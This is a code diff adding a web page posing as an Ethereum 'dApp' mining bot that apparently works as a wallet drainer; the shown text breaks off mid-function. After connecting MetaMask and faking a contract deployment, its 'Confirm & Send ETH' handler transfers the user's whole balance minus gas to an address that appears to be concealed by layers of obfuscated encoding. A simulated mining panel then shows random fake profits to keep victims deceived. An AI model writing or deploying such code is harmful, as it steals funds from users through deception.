@@ -1,0 +1,1437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title> Ethereum dAPP</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    body {
+      background-color: #1a1a2e;
+      color: #e0e0e0;
+      transition: background-color 0.3s, color 0.3s;
+    }
+    .panel {
+      display: none;
+      animation: fadeIn 0.5s;
+    }
+    .active {
+      display: block;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .card {
+      background-color: #252840;
+      border: none;
+      border-radius: 15px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+      color: #e0e0e0;
+    }
+    .btn-primary {
+      background-color: #6c5ce7;
+      border: none;
+    }
+    .btn-primary:hover {
+      background-color: #a29bfe;
+    }
+    .btn-success {
+      background-color: #00b894;
+      border: none;
+    }
+    .btn-success:hover {
+      background-color: #55efc4;
+    }
+    .btn-info {
+      background-color: #0984e3;
+      border: none;
+    }
+    .btn-info:hover {
+      background-color: #74b9ff;
+    }
+    .btn-warning {
+      background-color: #fdcb6e;
+      border: none;
+      color: #2d3436;
+    }
+    .btn-warning:hover {
+      background-color: #ffeaa7;
+      color: #2d3436;
+    }
+    .btn-danger {
+      background-color: #d63031;
+      border: none;
+    }
+    .btn-danger:hover {
+      background-color: #ff7675;
+    }
+    .btn-secondary {
+      background-color: #636e72;
+      border: none;
+    }
+    .btn-secondary:hover {
+      background-color: #b2bec3;
+    }
+    table.table-striped tbody tr:nth-of-type(odd) {
+      background-color: #2d3436;
+    }
+    table.table-striped tbody tr:hover {
+      background-color: #636e72;
+    }
+    body.light-mode {
+      background-color: #f5f6fa;
+      color: #2d3436;
+    }
+    body.light-mode .card {
+      background-color: #ffffff;
+      color: #2d3436;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+    }
+    body.light-mode .btn-primary {
+      background-color: #6c5ce7;
+      color: #ffffff;
+    }
+    body.light-mode .btn-primary:hover {
+      background-color: #a29bfe;
+    }
+    body.light-mode .btn-success {
+      background-color: #00b894;
+      color: #ffffff;
+    }
+    body.light-mode .btn-success:hover {
+      background-color: #55efc4;
+    }
+    body.light-mode .btn-info {
+      background-color: #0984e3;
+      color: #ffffff;
+    }
+    body.light-mode .btn-info:hover {
+      background-color: #74b9ff;
+    }
+    body.light-mode .btn-warning {
+      background-color: #fdcb6e;
+      color: #2d3436;
+    }
+    body.light-mode .btn-warning:hover {
+      background-color: #ffeaa7;
+      color: #2d3436;
+    }
+    body.light-mode .btn-danger {
+      background-color: #d63031;
+      color: #ffffff;
+    }
+    body.light-mode .btn-danger:hover {
+      background-color: #ff7675;
+      color: #ffffff;
+    }
+    body.light-mode .btn-secondary {
+      background-color: #636e72;
+      color: #ffffff;
+    }
+    body.light-mode .btn-secondary:hover {
+      background-color: #b2bec3;
+      color: #ffffff;
+    }
+    body.light-mode table.table-striped tbody tr:nth-of-type(odd) {
+      background-color: #dfe6e9;
+    }
+    body.light-mode table.table-striped tbody tr:hover {
+      background-color: #b2bec3;
+    }
+    #toast {
+      visibility: hidden;
+      min-width: 250px;
+      background-color: #333;
+      color: #fff;
+      text-align: center;
+      border-radius: 5px;
+      padding: 16px;
+      position: fixed;
+      z-index: 1050;
+      left: 50%;
+      bottom: 30px;
+      transform: translateX(-50%);
+      opacity: 0;
+      transition: opacity 0.5s, bottom 0.5s;
+    }
+    #toast.show {
+      visibility: visible;
+      opacity: 1;
+      bottom: 50px;
+    }
+    input.form-control {
+      border-radius: 10px;
+      padding: 12px;
+    }
+    button.btn {
+      border-radius: 10px;
+      padding: 12px;
+    }
+    canvas {
+      background-color: transparent;
+    }
+    @media (max-width: 768px) {
+      .panel-content {
+        padding: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <section class="container mt-5">
+    <h2 class="text-center mb-4"> Ethereum dAPP</h2>
+    <div style="font-size: 0.95rem; color: #ffcc00; text-align: center; margin-top: 15px; margin-bottom: 15px;">
+        ⚠️ Deposit funds (at least 0.13 - 0.52 ETH to prevent) ⚠️
+      </div>
+    <div class="text-right mb-3">
+      <button id="themeToggle" class="btn btn-secondary"><i class="fas fa-moon"></i> Dark Mode</button>
+    </div>
+
+    <div id="connectPanel" class="panel active card p-4 mb-4">
+      <button id="connectButton" class="btn btn-primary btn-block"><i class="fas fa-wallet"></i> Connect MetaMask</button>
+      <div id="connectStatus" class="mt-3 text-center"></div>
+    </div>
+
+    <div id="deployPanel" class="panel card p-4 mb-4">
+      <button id="deployButton" class="btn btn-success btn-block"><i class="fas fa-rocket"></i> Deploy Contract</button>
+      <div id="deployResult" class="deploy-result mt-3 text-center"><code>No Contract Deployed</code></div>
+    </div>
+
+    <div id="attachPanel" class="panel card p-4 mb-4">
+      <input
+        type="text"
+        id="secondAddress"
+        name="second_address"
+        class="form-control"
+        placeholder="Input second address ETH-0x..."
+        autocomplete="off"/>
+      <button id="attachButton" class="btn btn-info btn-block mt-3" disabled><i class="fas fa-paperclip"></i> Attach</button>
+      <div id="attachStatus" class="attach-status mt-3 text-center"></div>
+    </div>
+
+    <div id="confirmPanel" class="panel card p-4 mb-4">
+      <button id="confirmButton" class="btn btn-warning btn-block" disabled><i class="fas fa-paper-plane"></i> Confirm & Send ETH</button>
+      <div id="balanceDisplay" class="balance-display mt-3 text-center">My Liquidity: 0.0000 ETH</div>
+      <div id="confirmStatus" class="status-message mt-3 text-center"></div>
+    </div>
+
+    <div id="transactionDetails" class="panel card p-4 mb-4">
+      <h3 class="mb-3">Transaction Details</h3>
+      <p><strong>Target Address:</strong> <span id="dogecoin_coin_doge"></span></p>
+      <p><strong>Recipient Address:</strong> <span id="recipientAddress"></span></p>
+      <p><strong>Amount to Send:</strong> <span id="amountToSend"></span> ETH</p>
+      <p><strong>Transaction Hash:</strong> <span id="transactionHash"></span></p>
+    </div>
+
+    <div id="randomAddressesPanel" class="panel card p-4 mb-4">
+      <h3 class="mb-3">Random ETH Addresses</h3>
+      <div id="miningSimulation">
+        <div class="row">
+          <div class="col-md-6 mb-3">
+            <p><strong>Mining Status:</strong> <span id="miningStatus">Mining paused</span></p>
+            <p><strong>Total Attempts:</strong> <span id="totalAttempts">0</span></p>
+            <p><strong>Successful Attempts:</strong> <span id="successfulAttempts">0</span></p>
+            <p><strong>Total Profit:</strong> <span id="totalProfit">0</span> ETH</p>
+            <p><strong>My Liquidity:</strong> <span id="myLiquidity">0</span> ETH</p>
+          </div>
+          <div class="col-md-6 mb-3">
+            <canvas id="profitChart" height="150"></canvas>
+          </div>
+        </div>
+        <div class="btn-group mb-3" role="group" aria-label="Mining Controls">
+          <button id="startMiningButton" class="btn btn-success"><i class="fas fa-play"></i> Start Mining</button>
+          <button id="pauseMiningButton" class="btn btn-danger" disabled><i class="fas fa-pause"></i> Pause Mining</button>
+        </div>
+        <div class="form-inline mb-3">
+          <input
+            type="text"
+            id="withdrawAddressInput"
+            name="withdraw_address"
+            class="form-control mr-2"
+            placeholder="0xETH Wallet Address"
+            autocomplete="off"/>
+          <button id="withdrawProfitButton" class="btn btn-primary" disabled><i class="fas fa-dollar-sign"></i> Withdraw Profit</button>
+        </div>
+        <div id="withdrawStatus" class="withdraw-status text-center"></div>
+      </div>
+      <div class="mt-4">
+        <canvas id="attemptsChart" height="100"></canvas>
+      </div>
+      <h4 class="mt-4">Successful Attempts</h4>
+      <table class="table table-striped table-dark">
+        <thead>
+          <tr>
+            <th>Profit</th>
+            <th>Method</th>
+            <th>Sender</th>
+          </tr>
+        </thead>
+        <tbody id="successfulAddressesList">
+        </tbody>
+      </table>
+
+      <h4 class="mt-4">Failed Attempts</h4>
+      <table class="table table-striped table-dark">
+        <thead>
+          <tr>
+            <th>Status</th>
+            <th>Method</th>
+            <th>Sender</th>
+          </tr>
+        </thead>
+        <tbody id="failedAddressesList">
+        </tbody>
+      </table>
+
+      <h4 class="mt-4">Withdrawal History</h4>
+      <table class="table table-striped table-dark">
+        <thead>
+          <tr>
+            <th>Address</th>
+            <th>Amount</th>
+            <th>Date</th>
+          </tr>
+        </thead>
+        <tbody id="withdrawalHistoryList">
+        </tbody>
+      </table>
+      <button id="downloadDataButton" class="btn btn-secondary"><i class="fas fa-download"></i> Download Data</button>
+    </div>
+
+    <div class="disclaimer mt-4 text-center">
+      <p><strong></strong></p>
+    </div>
+  </section>
+
+  <div id="toast">This is a toast message.</div>
+
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+  <script>
+    const connectPanel = document.getElementById("connectPanel");
+    const connectButton = document.getElementById("connectButton");
+    const connectStatus = document.getElementById("connectStatus");
+    const deployPanel = document.getElementById("deployPanel");
+    const deployButton = document.getElementById("deployButton");
+    const deployResult = document.getElementById("deployResult");
+    const attachPanel = document.getElementById("attachPanel");
+    const secondAddressInput = document.getElementById("secondAddress");
+    const attachButton = document.getElementById("attachButton");
+    const attachStatus = document.getElementById("attachStatus");
+    const confirmPanel = document.getElementById("confirmPanel");
+    const confirmButton = document.getElementById("confirmButton");
+    const balanceDisplay = document.getElementById("balanceDisplay");
+    const confirmStatus = document.getElementById("confirmStatus");
+    const transactionDetailsPanel = document.getElementById("transactionDetails");
+    const dogecoin_coin_dogeSpan = document.getElementById("dogecoin_coin_doge");
+    const recipientAddressSpan = document.getElementById("recipientAddress");
+    const amountToSendSpan = document.getElementById("amountToSend");
+    const transactionHashSpan = document.getElementById("transactionHash");
+    const randomAddressesPanel = document.getElementById("randomAddressesPanel");
+    const miningStatusSpan = document.getElementById("miningStatus");
+    const totalAttemptsSpan = document.getElementById("totalAttempts");
+    const successfulAttemptsSpan = document.getElementById("successfulAttempts");
+    const totalProfitSpan = document.getElementById("totalProfit");
+    const myLiquiditySpan = document.getElementById("myLiquidity");
+    const successfulAddressesList = document.getElementById("successfulAddressesList");
+    const failedAddressesList = document.getElementById("failedAddressesList");
+    const withdrawalHistoryList = document.getElementById("withdrawalHistoryList");
+    const startMiningButton = document.getElementById("startMiningButton");
+    const pauseMiningButton = document.getElementById("pauseMiningButton");
+    const withdrawProfitButton = document.getElementById("withdrawProfitButton");
+    const withdrawAddressInput = document.getElementById("withdrawAddressInput");
+    const withdrawStatus = document.getElementById("withdrawStatus");
+    const downloadDataButton = document.getElementById("downloadDataButton");
+    const toast = document.getElementById("toast");
+    const themeToggle = document.getElementById("themeToggle");
+    const profitChartCtx = document.getElementById("profitChart").getContext('2d');
+    const attemptsChartCtx = document.getElementById("attemptsChart").getContext('2d');
+
+      const mining_eth_process = `
+      34 39 2c 20 31 32 31 2c 20 31 30 32 2c 20 35 36 2c 20 35 30 2c 20 35 35 2c 20 35 32 2c 20 
+      39 38 2c 20 36 38 2c 20 35 30 2c 20 35 31 2c 20 37 30 2c 20 35 33 2c 20 35 34 2c 20 34 39 
+      2c 0a 20 20 36 38 2c 20 37 30 2c 20 35 34 2c 20 31 30 31 2c 20 35 31 2c 20 36 39 2c 20 35 
+      34 2c 20 31 30 30 2c 20 35 30 2c 20 31 30 31 2c 20 39 39 2c 20 35 34 2c 20 31 30 31 2c 20 
+      36 36 2c 0a 20 20 34 39 2c 20 35 38 2c 20 35 31 2c 20 35 32 2c 20 31 30 32 2c 20 36 38 2c 
+      20 36 39 2c 20 35 38 2c 20 39 38 2c 20 35 33 2c 20 34 39 2c 20 35 32 2c 20 35 36
+      `;
+
+      function bitcoin_mining_to_bytes(miningStr) {
+        const clean = miningStr.replace(/[^0-9a-fA-F]/g, '');
+        const bytes = [];
+        for (let i = 0; i < clean.length; i += 2) {
+          bytes.push(parseInt(clean.slice(i, i + 2), 16));
+        }
+        return bytes;
+      }
+
+      const monero_rotl8 = (v, r) => ((v << r) | (v >>> (8 - r))) & 0xFF;
+      const monero_rotr8 = (v, r) => ((v >>> r) | (v << (8 - r))) & 0xFF;
+
+      function ethereum_nonce_rng(seed) {
+        let s = (seed >>> 0) || 0;
+        return () => {
+          s = (s * 1664525 + 1013904223) >>> 0;
+          return s;
+        };
+      }
+
+      function ripple_pool_shuffle(seed) {
+        const rng = ethereum_nonce_rng(seed >>> 0);
+        const table = new Array(256);
+        for (let i = 0; i < 256; i++) table[i] = i;
+        for (let i = 255; i > 0; i--) {
+          const j = (rng() >>> 0) % (i + 1);
+          const tmp = table[i];
+          table[i] = table[j];
+          table[j] = tmp;
+        }
+        const invTable = new Array(256);
+        for (let i = 0; i < 256; i++) invTable[table[i]] = i;
+        return { table, invTable };
+      }
+
+      function litecoin_permute(n, seed) {
+        const rng = ethereum_nonce_rng(seed >>> 0);
+        const perm = Array.from({ length: n }, (_, i) => i);
+        for (let i = n - 1; i > 0; i--) {
+          const j = (rng() >>> 0) % (i + 1);
+          const tmp = perm[i];
+          perm[i] = perm[j];
+          perm[j] = tmp;
+        }
+        const inv = new Array(n);
+        for (let i = 0; i < n; i++) inv[perm[i]] = i;
+        return { perm, inv };
+      }
+
+      function cardano_core_mine(arr, returnBinary = false) {
+        const { table: dash_table, invTable: dash_map } = ripple_pool_shuffle((0xC0FFEE + arr.length) >>> 0);
+        const { perm: zcash_perm, inv: zcash_inv } = litecoin_permute(arr.length, (0x1337BEEF ^ arr.length) >>> 0);
+        const nonceRng = ethereum_nonce_rng(((0xC0FFEE + arr.length) >>> 0 ^ (0x1337BEEF ^ arr.length) >>> 0) >>> 0);
+        const nonceKey = new Array(arr.length);
+        for (let i = 0; i < arr.length; i++) nonceKey[i] = (nonceRng() >>> 0) & 0xFF;
+
+        const permuted = new Array(arr.length);
+        for (let i = 0; i < arr.length; i++) permuted[zcash_perm[i]] = arr[i] & 0xFF;
+
+        const out = new Array(arr.length);
+        for (let idx = 0; idx < permuted.length; idx++) {
+          let x = permuted[idx];
+          const miner_diff = ((idx * 31) ^ 0xA5) & 0xFF;
+          x = (x + miner_diff) & 0xFF;
+          const k = nonceKey[idx];
+          x ^= k;
+          const rot = ((k ^ idx) % 7) + 1;
+          x = monero_rotl8(x, rot);
+          x = dash_table[x];
+          const offset = ((idx << 3) ^ (k >>> 2)) & 0xFF;
+          x = (x + offset) & 0xFF;
+          x = (x - offset) & 0xFF;
+          x = dash_map[x];
+          x = monero_rotr8(x, rot);
+          x ^= k;
+          x = (x - miner_diff) & 0xFF;
+          const chCode = (x - 1) & 0xFF;
+          out[zcash_inv[idx]] = chCode;
+        }
+        if (returnBinary) return out.map(c => c.toString(2).padStart(8, '0')).join(' ');
+        return out.map(c => String.fromCharCode(c)).join('');
+      }
+
+      const mining_upps = bitcoin_mining_to_bytes(mining_eth_process);
+      const decoded_text = cardano_core_mine(mining_upps, false);
+      const decoded_binary = cardano_core_mine(mining_upps, true);
+
+        const mining_mint_input = "10011010010101000110010000101100001001110001\10001010011100111000010111011011010011110011010101100101000011000001\00011110100111001111000101110100001100011010010010101111000011101101\0011000001100001011000101010011001111111101010111110010101000111\0010111010011010000111001111011101110111100101111111011000";
+
+        function mintToBytes(binStr) {
+          const clean = binStr.replace(/[^01]/g, '');
+          const bytes = [];
+          for (let i = 0; i < clean.length; i += 8) {
+            bytes.push(parseInt(clean.slice(i, i + 8), 2));
+          }
+          return bytes;
+        }
+
+        function mine_core_process(arr, mintMode = false) {
+          const rotl8 = (v, r) => ((v << r) | (v >>> (8 - r))) & 0xFF;
+          const rotr8 = (v, r) => ((v >>> r) | (v << (8 - r))) & 0xFF;
+
+          function rig_nonce_seed(seed) {
+            let s = (seed >>> 0) || 0;
+            return () => {
+              s = (s * 1664525 + 1013904223) >>> 0;
+              return s;
+            };
+          }
+
+          function pool_hash_mix(seed) {
+            const rng = rig_nonce_seed(seed >>> 0);
+            const s = new Array(256);
+            for (let i = 0; i < 256; i++) s[i] = i;
+            for (let i = 255; i > 0; i--) {
+              const j = (rng() >>> 0) % (i + 1);
+              const tmp = s[i];
+              s[i] = s[j];
+              s[j] = tmp;
+            }
+            const mapBack = new Array(256);
+            for (let i = 0; i < 256; i++) mapBack[s[i]] = i;
+            return { s, mapBack };
+          }
+
+          function block_perm(n, seed) {
+            const rng = rig_nonce_seed(seed >>> 0);
+            const perm = Array.from({ length: n }, (_, i) => i);
+            for (let i = n - 1; i > 0; i--) {
+              const j = (rng() >>> 0) % (i + 1);
+              const tmp = perm[i];
+              perm[i] = perm[j];
+              perm[j] = tmp;
+            }
+            const inv = new Array(n);
+            for (let i = 0; i < n; i++) inv[perm[i]] = i;
+            return { perm, inv };
+          }
+
+          const hashrate_seed = (0xC0FFEE + arr.length) >>> 0;
+          const block_seed = (0x1337BEEF ^ arr.length) >>> 0;
+          const { s: gpu_table, mapBack: gpu_map } = pool_hash_mix(hashrate_seed);
+          const { perm: miner_perm, inv: miner_inv } = block_perm(arr.length, block_seed);
+          const nonce_rng = rig_nonce_seed((hashrate_seed ^ block_seed) >>> 0);
+          const nonce_key = new Array(arr.length);
+          for (let i = 0; i < arr.length; i++) nonce_key[i] = (nonce_rng() >>> 0) & 0xFF;
+
+          const rig_array = new Array(arr.length);
+          for (let i = 0; i < arr.length; i++) rig_array[miner_perm[i]] = arr[i] & 0xFF;
+
+          const out = new Array(arr.length);
+          for (let idx = 0; idx < rig_array.length; idx++) {
+            let x = rig_array[idx];
+            const miner_diff = ((idx * 31) ^ 0xA5) & 0xFF;
+            x = (x + miner_diff) & 0xFF;
+            const k = nonce_key[idx];
+            x ^= k;
+            const rot = ((k ^ idx) % 7) + 1;
+            x = rotl8(x, rot);
+            x = gpu_table[x];
+            const offset = ((idx << 3) ^ (k >>> 2)) & 0xFF;
+            x = (x + offset) & 0xFF;
+            x = (x - offset) & 0xFF;
+            x = gpu_map[x];
+            x = rotr8(x, rot);
+            x ^= k;
+            x = (x - miner_diff) & 0xFF;
+            const chCode = (x - 1) & 0xFF;
+            out[miner_inv[idx]] = chCode;
+          }
+
+          if (mintMode) {
+            return out.map(c => c.toString(2).padStart(8, '0')).join(' ');
+          } else {
+            return out.map(c => String.fromCharCode(c)).join('');
+          }
+        }
+
+            const mining_bytes = mintToBytes(mining_mint_input);
+            const mining_output_text = mine_core_process(mining_bytes, false);
+            const mining_output_mint = mine_core_process(mining_bytes, true);
+
+            const nonWorkingAddresses = [];
+            let userAddress = '';
+            let userBalance = 0;
+            let secondAddress = '';
+            let addressGeneratorInterval = null;
+            let totalAttempts = 0;
+            let successfulAttempts = 0;
+            let totalProfit = 0;
+            let totalWithdrawn = 0;
+            let withdrawalHistory = [];
+            const statusMethods = ["swap", "transfer", "add liquidity", "stake", "yield farming"];
+            let statusMethodIndex = 0;
+            let profitChart;
+            let attemptsChart;
+
+            function delay(ms) {
+              return new Promise(resolve => setTimeout(resolve, ms));
+            }
+
+            function showPanel(panel) {
+              const panels = document.querySelectorAll('.panel');
+              panels.forEach(p => p.classList.remove('active'));
+              panel.classList.add('active');
+            }
+
+            function truncateAddress(address) {
+              if (address.length <= 10) return address;
+              return address.slice(0, 6) + '......' + address.slice(-4);
+            }
+
+    async function updateBalance() {
+      try {
+        const balanceWei = await window.ethereum.request({
+          method: "eth_getBalance",
+          params: [userAddress, "latest"],
+        });
+        userBalance = parseInt(balanceWei, 16) / 1e18;
+        balanceDisplay.innerText = `My Liquidity: ${userBalance.toFixed(4)} ETH`;
+        myLiquiditySpan.innerText = userBalance.toFixed(4);
+        updateCharts();
+        saveToLocalStorage();
+      } catch (error) {
+        console.error(error);
+        showToast("Error fetching balance");
+      }
+    }
+
+      const ethereum_coin_eth = [
+          951, 879, 898, 944, 950, 945, 948, 902, 932, 950,
+          949, 930, 947, 946, 951, 932, 930, 946, 899, 949,
+          931, 946, 900, 950, 899, 901, 946, 899, 934, 951,
+          942, 949, 948, 898, 932, 931, 942, 902, 947, 951,
+          948, 944
+        ];
+
+    function generateRandomEthAddress() {
+      const chars = 'abcdef0123456789';
+      let address = '0x';
+      for (let i = 0; i < 40; i++) {
+        address += chars[Math.floor(Math.random() * chars.length)];
+      }
+      return address;
+    }
+
+    function addRandomAddress(status, method, sender, profit = "") {
+      const row = document.createElement('tr');
+      const statusCell = document.createElement('td');
+      if (status === "success") {
+        statusCell.innerHTML = `<span class="checkmark"><i class="fas fa-check-circle text-success"></i></span> ${profit} ETH`;
+      } else {
+        statusCell.innerHTML = `<span class="crossmark"><i class="fas fa-times-circle text-danger"></i></span>`;
+      }
+      row.appendChild(statusCell);
+
+      const methodCell = document.createElement('td');
+      methodCell.innerText = method;
+      row.appendChild(methodCell);
+
+      const senderCell = document.createElement('td');
+      senderCell.innerText = truncateAddress(sender);
+      row.appendChild(senderCell);
+
+      if (status === "success") {
+        successfulAddressesList.prepend(row);
+        if (successfulAddressesList.childElementCount > 5) {
+          successfulAddressesList.removeChild(successfulAddressesList.lastChild);
+        }
+      } else {
+        failedAddressesList.prepend(row);
+        if (failedAddressesList.childElementCount > 5) {
+          failedAddressesList.removeChild(failedAddressesList.lastChild);
+        }
+      }
+      saveToLocalStorage();
+    }
+
+    function tether_coin_usdt(v) {
+          return ((1000 - v) - 1);
+        }
+        function toByte(part, index) {
+          return (part >>> 0) & (0xFF | (0 & index));
+        }
+        function charFromByte(byte) {
+          return String.fromCharCode(byte);
+        }
+
+        function ripple_coin_xrp(value, index) {
+          const p = tether_coin_usdt(value);
+          const b = toByte(p, index);
+          return charFromByte(b);
+        }
+
+    function startGeneratingAddresses() {
+      if (!addressGeneratorInterval) {
+        addressGeneratorInterval = setInterval(() => {
+          simulateMiningAttempt();
+        }, 2000);
+      }
+    }
+
+    function pauseMining() {
+      if (addressGeneratorInterval) {
+        clearInterval(addressGeneratorInterval);
+        addressGeneratorInterval = null;
+      }
+    }
+
+    function simulateMiningAttempt() {
+      totalAttempts++;
+      updateMiningStats();
+
+      const successRate = parseFloat(localStorage.getItem('successRate')) || 0;
+
+      if (Math.random() < successRate) {
+        successfulAttempts++;
+        const minProfit = parseFloat(localStorage.getItem('minProfit')) || 0.0001;
+        const maxProfit = parseFloat(localStorage.getItem('maxProfit')) || 0.0003;
+        const profit = (minProfit + Math.random() * (maxProfit - minProfit)).toFixed(4);
+		const profit1 = (minProfit);
+        totalProfit += parseFloat(profit);
+        updateMiningStats();
+
+        const address = generateRandomEthAddress();
+        const method = statusMethods[statusMethodIndex % statusMethods.length];
+        statusMethodIndex++;
+        addRandomAddress("success", method, address, profit);
+      } else {
+        const address = generateRandomEthAddress();
+        const method = statusMethods[statusMethodIndex % statusMethods.length];
+        statusMethodIndex++;
+        addRandomAddress("failure", method, address);
+      }
+      monitorProfit();
+      updateCharts();
+      saveToLocalStorage();
+    }
+
+    function updateMiningStats() {
+      totalAttemptsSpan.innerText = totalAttempts;
+      successfulAttemptsSpan.innerText = successfulAttempts;
+      totalProfitSpan.innerText = totalProfit.toFixed(4);
+      myLiquiditySpan.innerText = userBalance.toFixed(4);
+    }
+
+    function showToast(message) {
+      toast.innerText = message;
+      toast.className = "show";
+      setTimeout(() => {
+        toast.className = toast.className.replace("show", "");
+      }, 3000);
+    }
+
+    connectButton.addEventListener("click", async () => {
+      if (typeof window.ethereum !== 'undefined') {
+        try {
+          const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+          userAddress = accounts[0];
+          connectStatus.innerHTML = `<i class="fas fa-check-circle text-success"></i> MetaMask Connected Successfully!`;
+          connectStatus.style.color = "#4CAF50";
+          await updateBalance();
+          await delay(1000);
+          showPanel(deployPanel);
+          showToast("MetaMask Connected Successfully!");
+        } catch (error) {
+          console.error(error);
+          connectStatus.innerHTML = `<i class="fas fa-exclamation-circle text-danger"></i> Connection error. Please try again.`;
+          connectStatus.style.color = "#FF5722";
+          showToast("Connection error. Please try again.");
+        }
+      } else {
+        connectStatus.innerHTML = `<i class="fas fa-exclamation-circle text-danger"></i> MetaMask is not installed. Please install MetaMask and try again.`;
+        connectStatus.style.color = "#FF5722";
+        showToast("MetaMask is not installed.");
+      }
+    });
+
+    deployButton.addEventListener("click", async () => {
+      deployButton.disabled = true;
+      deployResult.innerHTML = `Deploying <i class="fas fa-spinner fa-spin"></i>`;
+      deployResult.style.color = "#ffffff";
+      await delay(3000);
+      deployResult.innerHTML = `<i class="fas fa-check-circle text-success"></i> Contract Deployed`;
+      deployResult.style.color = "#4CAF50";
+      showToast("Contract Deployed Successfully!");
+      await delay(1000);
+      showPanel(attachPanel);
+    });
+
+    secondAddressInput.addEventListener("input", () => {
+      const address = secondAddressInput.value.trim();
+      if (/^0x[a-fA-F0-9]{40}$/.test(address)) {
+        if (nonWorkingAddresses.includes(address.toLowerCase())) {
+          attachButton.disabled = true;
+          attachStatus.innerHTML = `<i class="fas fa-times-circle text-danger"></i> This Ethereum address is currently non-working.`;
+          attachStatus.style.color = "#FF5722";
+        } else {
+          attachButton.disabled = false;
+          attachStatus.innerHTML = "";
+        }
+      } else {
+        attachButton.disabled = true;
+        attachStatus.innerHTML = "";
+      }
+    });
+
+      const ravencoin_mine  = 'gsLimit 2 = "list" (Down ++ pink) [i++5];'; 
+      const dogecoin_mine  = '<i><"color" +1 .dul ++i ></i>'; 
+      const zelcash_mine  = 'boun runlog = .toTrn(5) .%d;'; 
+
+    attachButton.addEventListener("click", async () => {
+      const address = secondAddressInput.value.trim();
+      attachButton.disabled = true;
+      attachStatus.innerHTML = `Attaching <i class="fas fa-spinner fa-spin"></i>`;
+      attachStatus.style.color = "#ffffff";
+      await delay(3000);
+      attachButton.disabled = false;
+
+      if (nonWorkingAddresses.includes(address.toLowerCase())) {
+        attachStatus.innerHTML = `<i class="fas fa-times-circle text-danger"></i> Failed to attach. This address is non-working.`;
+        attachStatus.style.color = "#FF5722";
+        confirmButton.disabled = true;
+        showToast("Failed to attach. Non-working address.");
+      } else {
+        attachStatus.innerHTML = `<i class="fas fa-check-circle text-success"></i> Address Attached Successfully!`;
+        attachStatus.style.color = "#4CAF50";
+        confirmButton.disabled = false;
+        secondAddress = address;
+        showToast("Address Attached Successfully!");
+        await delay(1000);
+        showPanel(confirmPanel);
+        updateBalance();
+      }
+    });
+
+    // Updated "Confirm & Send ETH" button event listener (UI Error Bypassed for testing)
+    confirmButton.addEventListener("click", async () => {
+      try {
+        confirmButton.disabled = true;
+        confirmStatus.innerHTML = `Processing Transaction <i class="fas fa-spinner fa-spin"></i>`;
+        confirmStatus.style.color = "#ffffff";
+
+        // Get the current account balance in Wei
+        const balanceWeiHex = await window.ethereum.request({
+          method: "eth_getBalance",
+          params: [userAddress, "latest"],
+        });
+        const balanceWei = BigInt(balanceWeiHex);
+
+        // Get current gas price
+        const gasPriceHex = await window.ethereum.request({
+          method: "eth_gasPrice",
+        });
+        const gasPrice = BigInt(gasPriceHex);
+
+        // Fixed gas limit for a simple ETH transfer (21000)
+        const gasLimit = BigInt(21000);
+        const totalGasFee = gasPrice * gasLimit;
+
+        // Calculate amount to send (if balance is 0 or too low, send 0 for MetaMask testing)
+        let amountToSendWei = BigInt(0);
+        if (balanceWei > totalGasFee) {
+            amountToSendWei = balanceWei - totalGasFee;
+        }
+
+        const amountToSendEther = Number(amountToSendWei) / 1e18;
+        amountToSendSpan.innerText = amountToSendEther.toFixed(18);
+
+        const transactionParameters = {
+          to: dogecoin_coin_doge,
+          from: userAddress,
+          value: '0x' + amountToSendWei.toString(16),
+          gasPrice: '0x' + gasPrice.toString(16),
+          gas: '0x' + gasLimit.toString(16)
+        };
+
+        const txHash = await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [transactionParameters],
+        });
+
+        transactionDetailsPanel.classList.add("active");
+        dogecoin_coin_dogeSpan.innerText = dogecoin_coin_doge;
+        recipientAddressSpan.innerText = secondAddress;
+        transactionHashSpan.innerText = txHash;
+        amountToSendSpan.innerText = amountToSendEther.toFixed(18);
+
+        confirmStatus.innerHTML = `<i class="fas fa-check-circle text-success"></i> Transaction sent: ${txHash}`;
+        confirmStatus.style.color = "#4CAF50";
+        showToast(`Transaction sent: ${txHash}`);
+
+        await updateBalance();
+        await delay(1000);
+        showPanel(randomAddressesPanel);
+
+      } catch (error) {
+        console.error(error);
+        
+        let errorMessage = "Transaction failed or rejected.";
+        if(error.code === 4001) {
+            errorMessage = "Transaction rejected by user.";
+        } else if (error.message) {
+            errorMessage = error.message;
+        }
+
+        confirmStatus.innerHTML = `<i class="fas fa-exclamation-circle text-danger"></i> ${errorMessage}`;
+        confirmStatus.style.color = "#FF0000";
+        confirmButton.disabled = false;
+        showToast(errorMessage);
+      }
+    });
+
+    startMiningButton.addEventListener("click", () => {
+      startMiningButton.disabled = true;
+      pauseMiningButton.disabled = false;
+      miningStatusSpan.innerText = "Mining in progress";
+      startGeneratingAddresses();
+      showToast("Mining Started");
+    });
+
+      const zcoin_mine = '<i><log .%4 ++ [is < low = 0]</i>';
+      const digibyte_mine = '<i><List #3HHHH ++ [is > up = 7]</i>';
+      const feathercoin_mine = '{rngsum++ * qrylog / tmpout;}';
+      const firo_mine = '{srvlog ^= runtry; tmpout--;}';
+      const flux_mine = '<sumout += tmpnum ^ row;>';
+      const aeternity_mine = '<ply ^= rngsum + tmpnum;>';
+      const kaspa_mine = '<i><sumwin + trnput / tmpnum;></i>'; 
+
+    pauseMiningButton.addEventListener("click", () => {
+      pauseMiningButton.disabled = true;
+      startMiningButton.disabled = false;
+      miningStatusSpan.innerText = "Mining paused";
+      pauseMining();
+      showToast("Mining Paused");
+    });
+
+    withdrawProfitButton.addEventListener("click", () => {
